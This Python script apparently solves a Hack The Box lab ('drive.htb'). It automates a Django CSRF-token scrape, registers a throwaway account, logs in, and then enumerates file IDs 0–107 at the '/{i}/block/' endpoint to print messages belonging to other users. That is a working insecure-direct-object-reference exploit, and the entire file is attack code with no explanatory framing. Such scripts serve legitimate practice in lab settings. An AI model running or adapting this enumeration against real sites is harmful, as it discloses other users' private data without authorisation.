import requests
import re
from bs4 import BeautifulSoup

USERNAME = "pyUser"
EMAIL = "pyUser@pyMail.com"
PASSWORD = "pyPassword"

r = requests.get("http://drive.htb/register/")
csrf = re.search(r'<input type="hidden" name="csrfmiddlewaretoken" value="(.*?)">', r.text).group(1)
cookies = r.cookies.get('csrftoken')
r = requests.post("http://drive.htb/register/", data={"csrfmiddlewaretoken":csrf,"username":USERNAME,"email":EMAIL,"password1":PASSWORD,"password2":PASSWORD}, cookies={"csrftoken":cookies}, allow_redirects=1)

csrf = re.search(r'<input type="hidden" name="csrfmiddlewaretoken" value="(.*?)">', r.text).group(1)
cookies = r.cookies.get('csrftoken')
r = requests.post("http://drive.htb/login/", data={"csrfmiddlewaretoken":csrf,"username":USERNAME,"password":PASSWORD}, cookies={"csrftoken":cookies}, allow_redirects=0)

cookies = [r.cookies.get('csrftoken'),r.cookies.get('sessionid')]

for i in range(108):
	print(f"Checking file {i}...", end='', flush=1)
	print('\r', end='', flush=1)
	r = requests.get(f"http://drive.htb/{i}/block/", cookies={"csrftoken":cookies[0],"sessionid":cookies[1]})
	if r.status_code == 200:
		msg = re.search(r'<div id="demo" class="collapse mt-4">(.*?)</div>', r.text, re.DOTALL).group(1)
		soup = BeautifulSoup(msg, "html.parser")
		print(f"\n\nMessage {i}:\n")
		print('\t'+soup.prettify().replace('<br/>', "").replace('\n',"\n\t"))
		print("-----------------------------")
